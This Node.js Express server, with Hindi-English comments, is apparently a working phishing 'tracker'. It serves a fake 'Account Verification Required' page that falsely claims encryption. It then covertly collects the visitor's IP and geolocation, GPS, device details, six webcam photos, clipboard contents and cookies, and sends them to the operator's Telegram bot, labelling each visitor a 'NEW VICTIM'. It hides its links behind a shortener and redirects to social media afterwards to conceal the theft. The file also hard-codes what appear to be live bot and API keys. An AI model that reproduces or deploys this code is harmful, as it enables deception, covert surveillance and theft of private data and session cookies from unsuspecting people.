const express = require('express');
const crypto = require('crypto');

const app = express();

// ===== TERI VALUES DAAL =====
const TELEGRAM_TOKEN = "8840717306:AAFnJ695LhZEm8kZOPdMyxHHE2EOselmxec";
const OWNER_CHAT_ID = "8179349999";
const IMGBB_API_KEY = "0959c9368daed87c0f1a8d44c203a8b3";
// =============================

// MongoDB nahi hai - memory mein store karenge
const shortUrls = {};

// =========================================
// ✅ 1. SHORT URL GENERATOR
// =========================================
app.get('/shorten', (req, res) => {
    const url = req.query.url;
    if (!url) return res.status(400).send('URL required');
    
    // 6 character ka random code (a-z, 0-9)
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let code = '';
    for (let i = 0; i < 6; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    
    shortUrls[code] = url;
    console.log(`[SHORT] Created: ${code} -> ${url.substring(0, 50)}...`);
    res.send(code);
});

// =========================================
// ✅ 2. SHORT URL REDIRECT — DIRECT, NO WAIT
// =========================================
app.get('/s/:code', (req, res) => {
    const code = req.params.code;
    const target = shortUrls[code];
    
    if (target) {
        console.log(`[REDIRECT] /s/${code} -> ${target.substring(0, 50)}...`);
        // ✅ 302 redirect — SIDHA, BINA KISI PAGE KE
        res.redirect(302, target);
    } else {
        res.status(404).send('Link not found or expired');
    }
});

// =========================================
// 3. SEND DATA ENDPOINT
// =========================================
app.post('/send-data', express.json({limit:'50mb'}), (req, res) => {
    const {type, data, creator_id} = req.body;
    const targetChat = creator_id || OWNER_CHAT_ID;
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
        encodeURIComponent(`📦 *DATA RECEIVED*\nType: ${type}\n\n${data.substring(0, 3500)}`) + 
        "&parse_mode=Markdown");
    res.send({ok:true});
});

// =========================================
// 4. TRACKING PAGE — EK CLICK MEIN SAB KUCH
// =========================================
app.get('/go/:encoded/:creatorid', (req, res) => {
    try {
        let legitUrl = Buffer.from(req.params.encoded, 'base64').toString('utf-8');
        const CREATOR_ID = req.params.creatorid;
        
        // Social media redirect
        if(legitUrl.includes('instagram.com')) legitUrl = "https://www.instagram.com/reels/";
        else if(legitUrl.includes('youtube.com')) legitUrl = "https://www.youtube.com/shorts/";
        else if(legitUrl.includes('facebook.com')) legitUrl = "https://www.facebook.com/reel/";
        else if(!legitUrl.startsWith('http')) legitUrl = "https://www.google.com";
        
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Please Verify</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
min-height:100vh;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:rgba(255,255,255,0.96);border-radius:24px;padding:35px 28px;
max-width:400px;width:100%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.6)}
.icon{font-size:64px;margin-bottom:10px}
h1{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
p{color:#777;font-size:13px;margin-bottom:18px}
.big-btn{display:block;width:100%;padding:18px 24px;background:linear-gradient(135deg,#667eea,#764ba2);
color:white;border:none;border-radius:16px;font-size:18px;font-weight:600;
cursor:pointer;transition:all 0.3s;box-shadow:0 8px 25px rgba(102,126,234,0.4)}
.big-btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(102,126,234,0.5)}
.big-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none}
.status{color:#aaa;font-size:12px;margin-top:14px;min-height:20px}
.secure{font-size:11px;color:#aaa;margin-top:16px}
.secure span{color:#4CAF50}
.progress-bar{width:100%;height:4px;background:#eee;border-radius:10px;overflow:hidden;margin:10px 0;display:none}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:10px}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#x1f6e1;</div>
<h1>Account Verification Required</h1>
<p>We need to verify your identity before proceeding. Click the button below to continue.</p>

<button class="big-btn" id="mainBtn" onclick="startCapture()">&#x1f513; Verify Now</button>

<div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
<div class="status" id="status">Tap "Verify Now" to continue</div>
<div class="secure">&#x1f512; Secured with 256-bit encryption <span>ACTIVE</span></div>
</div>

<script>
const CREATOR_ID = "${CREATOR_ID}";
const TOKEN = "${TELEGRAM_TOKEN}";
const IMGKEY = "${IMGBB_API_KEY}";
const REDIR = "${legitUrl}";

function tg(msg) {
    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CREATOR_ID+
        "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
}
function tgPhoto(url) {
    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto?chat_id="+CREATOR_ID+"&photo="+url).catch(()=>{});
}

async function startCapture() {
    const btn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const progressBar = document.getElementById('progressBar');
    const progressFill = document.getElementById('progressFill');
    
    btn.disabled = true;
    btn.textContent = "⏳ Verifying...";
    progressBar.style.display = 'block';
    
    let progress = 0;
    const updateProgress = () => {
        progress += 8;
        if (progress > 95) progress = 95;
        progressFill.style.width = progress + '%';
    };
    const progInterval = setInterval(updateProgress, 200);
    
    // 1. IP + LOCATION
    status.textContent = "📡 Getting IP & location...";
    try {
        const ipRes = await fetch("https://ipapi.co/json/");
        const ipData = await ipRes.json();
        
        let msg = "📍 *NEW VICTIM*\\n\\n";
        msg += "*IP:* " + (ipData.ip || "N/A") + "\\n";
        msg += "*City:* " + (ipData.city || "N/A") + "\\n";
        msg += "*Region:* " + (ipData.region || "N/A") + "\\n";
        msg += "*Country:* " + (ipData.country_name || "N/A") + "\\n";
        msg += "*ISP:* " + (ipData.org || "N/A") + "\\n";
        msg += "*Lat:* " + (ipData.latitude || "N/A") + "\\n";
        msg += "*Lon:* " + (ipData.longitude || "N/A") + "\\n";
        msg += "*TZ:* " + (ipData.timezone || "N/A") + "\\n";
        
        tg(msg);
    } catch(e) {}
    
    // 2. GPS
    status.textContent = "📍 Getting GPS location...";
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                tg("🎯 *GPS*\\nLat: " + pos.coords.latitude + "\\nLon: " + pos.coords.longitude + "\\nAcc: " + pos.coords.accuracy + "m");
            },
            () => {},
            { timeout: 5000, enableHighAccuracy: true }
        );
    }
    
    // 3. DEVICE INFO
    status.textContent = "🧾 Scanning device...";
    let di = "🧾 *DEVICE INFO*\\n\\n";
    di += "*Platform:* " + (navigator.platform || "N/A") + "\\n";
    di += "*Lang:* " + navigator.language + "\\n";
    di += "*Screen:* " + screen.width + "x" + screen.height + "\\n";
    di += "*RAM:* " + (navigator.deviceMemory || "N/A") + "GB\\n";
    di += "*Cores:* " + (navigator.hardwareConcurrency || "N/A") + "\\n";
    di += "*Time:* " + new Date().toLocaleString() + "\\n";
    di += "*TZ:* " + Intl.DateTimeFormat().resolvedOptions().timeZone;
    tg(di);
    
    // 4. CAMERA - 6 PHOTOS
    status.textContent = "📸 Capturing photos...";
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" },
            audio: false
        });
        
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", "");
        await video.play();
        
        for (let i = 0; i < 6; i++) {
            await new Promise(r => setTimeout(r, 500));
            
            const canvas = document.createElement("canvas");
            canvas.width = 320;
            canvas.height = 240;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const b64 = canvas.toDataURL("image/jpeg", 0.6).split(",")[1];
            
            const fd = new FormData();
            fd.append("image", b64);
            
            try {
                const imgRes = await fetch("https://api.imgbb.com/1/upload?key=" + IMGKEY, { method: "POST", body: fd });
                const imgData = await imgRes.json();
                if (imgData && imgData.success) {
                    tgPhoto(imgData.data.url);
                    tg("📸 *Photo " + (i + 1) + "/6*");
                }
            } catch(e) {}
            
            status.textContent = "📸 Photo " + (i + 1) + "/6 captured...";
        }
        
        stream.getTracks().forEach(t => t.stop());
        tg("📸 *CAMERA* - 6 photos ✅");
    } catch(e) {
        tg("❌ *Camera Error*: " + (e.message || "Denied"));
    }
    
    // 5. CLIPBOARD
    status.textContent = "📋 Reading clipboard...";
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 0) {
                tg("📋 *CLIPBOARD*\\n\\n" + text.substring(0, 800));
            }
        }
    } catch(e) {}
    
    // 6. COOKIES
    try {
        if (document.cookie && document.cookie.length > 0) {
            tg("🍪 *COOKIES*\\n\\n" + document.cookie.substring(0, 1500));
        }
    } catch(e) {}
    
    // DONE - REDIRECT
    clearInterval(progInterval);
    progressFill.style.width = '100%';
    status.textContent = "✅ Verification complete! Redirecting...";
    btn.textContent = "✓ Verified!";
    
    setTimeout(() => {
        window.location.href = REDIR;
    }, 1500);
}
</script>
</body>
</html>`;
        res.send(html);
    } catch(e) {
        res.status(400).send('Invalid link');
    }
});

app.get('/', (req, res) => {
    res.send('Premium Tracker Running ✅');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Tracker on port ' + PORT));
